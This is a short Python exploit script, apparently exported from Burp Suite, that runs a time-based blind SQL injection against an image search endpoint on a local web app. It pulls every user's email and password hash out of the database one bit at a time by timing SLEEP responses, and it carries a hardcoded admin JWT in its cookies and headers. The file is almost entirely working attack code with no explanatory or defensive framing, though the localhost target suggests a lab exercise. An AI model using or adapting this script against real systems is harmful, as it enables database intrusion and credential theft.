import requests

burp0_cookies = {"access_token": "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOjQsImVtYWlsIjoiYWJjQGdtYWlsLmNvbSIsInJvbGUiOiJhZG1pbiIsImlhdCI6MTc4MzMwODY0OCwiZXhwIjoxNzgzMzk1MDQ4fQ.TFyOFy-zh5Ki2w_el9UOgQjdvBtGMThf5pToxAy8DaSZKF1qF2qOpKTu8vLarsCTuVfaaeqjIGmDidwGkOlZMENkh846tav_V7H2rzXAQhPRTb_0z_Tn-fPAhICNmXBqr8UyEgjH0a_Eq7J7qtWoSZqTyGnci5ubsEZC0oeRhb-dZB2RkYN814dcSNGORKzfMjGkk-wl8Zm6to_1Wvg0NhTSbPYVOwHrz-4lGkEOwwiiQnqTqfCQuVhV1tu3WVB4AKTaPxEvaopvQO4r2CG82rlA7hx74PWgDMRuP8724dkyH4YFLo_5F7hczPhunbZCOEr4SjC3RRze004vuXzk-Q", "__next_hmr_refresh_hash__": "171"}
burp0_headers = {"sec-ch-ua-platform": "\"Windows\"", "authorization": "Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOjQsImVtYWlsIjoiYWJjQGdtYWlsLmNvbSIsInJvbGUiOiJhZG1pbiIsImlhdCI6MTc4MzMwODY0OCwiZXhwIjoxNzgzMzk1MDQ4fQ.TFyOFy-zh5Ki2w_el9UOgQjdvBtGMThf5pToxAy8DaSZKF1qF2qOpKTu8vLarsCTuVfaaeqjIGmDidwGkOlZMENkh846tav_V7H2rzXAQhPRTb_0z_Tn-fPAhICNmXBqr8UyEgjH0a_Eq7J7qtWoSZqTyGnci5ubsEZC0oeRhb-dZB2RkYN814dcSNGORKzfMjGkk-wl8Zm6to_1Wvg0NhTSbPYVOwHrz-4lGkEOwwiiQnqTqfCQuVhV1tu3WVB4AKTaPxEvaopvQO4r2CG82rlA7hx74PWgDMRuP8724dkyH4YFLo_5F7hczPhunbZCOEr4SjC3RRze004vuXzk-Q", "Accept-Language": "en-US,en;q=0.9", "sec-ch-ua": "\"Not-A.Brand\";v=\"24\", \"Chromium\";v=\"146\"", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36", "sec-ch-ua-mobile": "?0", "Accept": "*/*", "Sec-Fetch-Site": "same-origin", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Dest": "empty", "Referer": "http://localhost:3000/my-images", "Accept-Encoding": "gzip, deflate, br", "Connection": "keep-alive"}

arr = [1, 2, 4, 8, 16, 32, 64, 128]
binary = ''
result = ''

for i in range(1, 100):
    for j in arr:
        burp0_url = f"http://localhost:3000/api/images/my?search=aa'+OR+IF(ASCII(SUBSTRING((SELECT+GROUP_CONCAT(CONCAT(email,'~',password_hash))+FROM+users),+{i},+1)+)+%26+{j}+>+0,+SLEEP(2),+SLEEP(0)+)+--+-"

        res = requests.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies)
        if res.elapsed.total_seconds() > 2:
            binary = '1' + binary
        else:
            binary = '0' + binary
    result += chr(int(binary, 2))
    print("Table users: " + result, end='\r')
    binary = ''  

# burp0_url = f"http://localhost:3000/api/images/my?search=aa'+OR+IF(ASCII(SUBSTRING((SELECT+GROUP_CONCAT(CONCAT(email,'~',password_hash))+FROM+users),+1,+1)+)+%26+1+>+0,+SLEEP(2),+SLEEP(0)+)+--+-"
# res = requests.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies)
# print(res.elapsed.total_seconds())
